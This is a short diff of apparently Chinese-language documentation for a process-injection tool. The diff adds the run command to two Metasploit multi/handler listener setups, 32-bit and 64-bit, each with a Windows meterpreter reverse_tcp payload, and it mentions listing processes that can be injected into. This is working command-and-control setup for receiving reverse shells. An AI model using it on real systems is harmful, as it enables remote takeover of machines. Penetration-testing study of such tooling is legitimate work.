@@ -53,12 +53,14 @@ msf6 > use exploit/multi/handler
 msf6 > set payload windows/meterpreter/reverse_tcp
 msf6 > set lhost 192.168.1.116
 msf6 > set lport 9999
+msf6 exploit(multi/handler) > exploit
 
 64位侦听器配置
 msf6 > use exploit/multi/handler
 msf6 > set payload windows/x64/meterpreter/reverse_tcp
 msf6 > set lhost 192.168.93.128
 msf6 > set lport 9999
+msf6 exploit(multi/handler) > exploit
 ```
 
 **输出可注入进程:** 列举出目前系统中支持注入的进程，输出参数中最左侧是位数，只可做参考有时不太准确。
